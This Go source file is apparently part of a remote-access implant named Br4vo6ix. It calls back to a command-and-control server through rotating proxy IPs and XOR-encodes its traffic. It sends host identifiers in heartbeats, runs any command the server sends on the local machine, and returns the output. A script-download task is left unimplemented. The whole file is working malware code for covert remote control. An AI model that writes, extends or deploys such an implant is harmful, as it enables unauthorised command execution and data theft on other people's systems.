package main

import (
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/BradHacker/Br4vo6ix/pb"
	"github.com/denisbrodbeck/machineid"
	"github.com/shirou/gopsutil/host"
	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/types/known/timestamppb"
)

// AttemptCallback tries to make a callback to the C2 server via the proxy servers
func AttemptCallback(proxyIps []string, proxyPorts []int) {
	// Shuffle the IPs each time to it tries them in different orders
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(proxyIps), func(i, j int) { proxyIps[i], proxyIps[j] = proxyIps[j], proxyIps[i] })
	for _, c2 := range proxyIps {
		// Choose a random port to callback on
		rand.Seed(time.Now().UnixNano())
		port := proxyPorts[rand.Intn(len(proxyPorts))]
		// Attempt to check for tasks with C2 server
		didConnect := CheckForTasks(c2, port)
		// If we communicated with the server successfully, just go back to sleep
		if didConnect {
			break
		}
		// otherwise wait 10 secs and then try the next ip address
		time.Sleep(10 * time.Second)
	}
}

// EncodeDecodeData XOR's the data with the global XOR_KEY
func EncodeDecodeData(data []byte) []byte {
	output := make([]byte, len(data))
	for i, inputByte := range data {
		output[i] = inputByte ^ []byte(XOR_KEY)[i%len(XOR_KEY)]
	}
	return output
}

// GenerateHeartbeat generates a heartbeat protobuf object to send back to the C2 server
func GenerateHeartbeat(port int) pb.Heartbeat {
	implant_id, _ := machineid.ProtectedID(XOR_KEY)
	host, err := host.Info()
	var hostname string
	if err != nil {
		hostname = "unknown"
	} else {
		hostname = host.Hostname
	}
	return pb.Heartbeat{
		Hostname:  hostname,
		Ip:        BOX_IP,
		Port:      int64(port),
		MachineId: implant_id,
		Pid:       int64(os.Getpid()),
		SentAt:    &timestamppb.Timestamp{},
	}
}

// SendHeartbeat sends a heartbeat back to the C2 server via a pre-existing connection
func SendHeartbeat(c *net.Conn, port int) error {
	// Generate and marshal the heartbeat object
	hb := GenerateHeartbeat(port)
	hbBytes, err := proto.Marshal(&hb)
	if err != nil {
		return fmt.Errorf("couldn't marshalling heartbeat: %v", err)
	}
	// Encode the heartbeat object
	encHbBytes := EncodeDecodeData(hbBytes)
	// Send the heartbeat object over the connection
	numSentBytes, err := (*c).Write(encHbBytes)
	if err != nil {
		return fmt.Errorf("couldn't sending heartbeat: %v", err)
	}
	// Ensure all bytes were sent
	if numSentBytes != len(hbBytes) {
		return fmt.Errorf("didn't send all bytes (sent %d of %d)", numSentBytes, len(hbBytes))
	}
	return nil
}

// SendTaskResponse send the output of a task to the C2 server via a pre-existing connection
func SendTaskResponse(c *net.Conn, t *pb.Task, stdout string, stderr string) error {
	// Generate response object containing the task stdout, stderr, and the task UUID
	tRes := pb.TaskResponse{
		Uuid:   t.Uuid,
		Stdout: stdout,
		Stderr: stderr,
	}
	// Marshal and encode the protobuf object
	tResBytes, err := proto.Marshal(&tRes)
	if err != nil {
		return fmt.Errorf("couldn't marshalling task response: %v", err)
	}
	encResBytes := EncodeDecodeData(tResBytes)
	// Send the task response over the connection
	numSentBytes, err := (*c).Write(encResBytes)
	if err != nil {
		return fmt.Errorf("couldn't sending task response: %v", err)
	}
	// Ensure all bytes were sent
	if numSentBytes != len(tResBytes) {
		return fmt.Errorf("didn't send all bytes (sent %d of %d)", numSentBytes, len(tResBytes))
	}
	return nil
}

// SpawnConnection attempts to dial a TCP connection to a remote host on a given port
func SpawnConnection(ip string, port int) (*net.Conn, error) {
	con, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return nil, fmt.Errorf("error dialling remote host")
	}
	return &con, nil
}

// ExecuteTaskCMD executes a CMD task object, resulting in the command payload being executed on the local host
func ExecuteTaskCMD(t *pb.Task) (string, string) {
	// Split the command into arguments
	cmdParts := strings.Split(t.Payload, " ")
	// First argument is the command
	cmd := cmdParts[0]
	// Everything else is arguments to the command
	args := cmdParts[1:]
	// Execute the command and collect stdout and stderr
	command := exec.Command(cmd, args...)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr
	err := command.Run()
	if err != nil {
		return "", fmt.Sprintf("error executing task: %v", err)
	}
	return stdout.String(), stderr.String()
}

// ExecuteTaskSCRIPT is not implemented yet [WIP]
func ExecuteTaskSCRIPT(t *pb.Task) (string, string) {
	return "", fmt.Sprintf("not implemented yet: %v", t)
}

// CheckForTasks attempts a connection to the C2 server and checks for any queued tasks. If successful, returns TRUE, otherwise returns FALSE.
func CheckForTasks(serverIp string, serverPort int) bool {
	// Attempt to connect to the C2 server
	c, err := SpawnConnection(serverIp, serverPort)
	if err != nil {
		return false
	}
	defer (*c).Close()

	// Send a heartbeat to the server asking for queued tasks
	err = SendHeartbeat(c, serverPort)
	if err != nil {
		return false
	}

	// Read the server response
	taskBytes := make([]byte, 4069)
	taskNumBytes, err := (*c).Read(taskBytes)
	if err != nil {
		if taskNumBytes == 0 {
			return false
		}
		return false
	}
	// Decode the server response
	decTaskBytes := EncodeDecodeData(taskBytes[:taskNumBytes])
	queuedTask := pb.Task{}
	// Unmarshal the server response
	err = proto.Unmarshal(decTaskBytes, &queuedTask)
	if err != nil {
		return false
	}

	// Execute the task based on type
	var stdout string
	var stderr string
	switch queuedTask.Type {
	// NOOP: no queued operations
	case pb.Task_NOOP:
		// The server does not expect a response in the event of a NOOP
		return true
		// CMD: Execute command(s)
	case pb.Task_CMD:
		stdout, stderr = ExecuteTaskCMD(&queuedTask)
		// SCRIPT: Download and execute script
	case pb.Task_SCRIPT:
		stdout, stderr = ExecuteTaskSCRIPT(&queuedTask)
	}

	// Send the stdout and stderr back to the server
	err = SendTaskResponse(c, &queuedTask, stdout, stderr)
	if err != nil {
		return false
	}
	return false
}
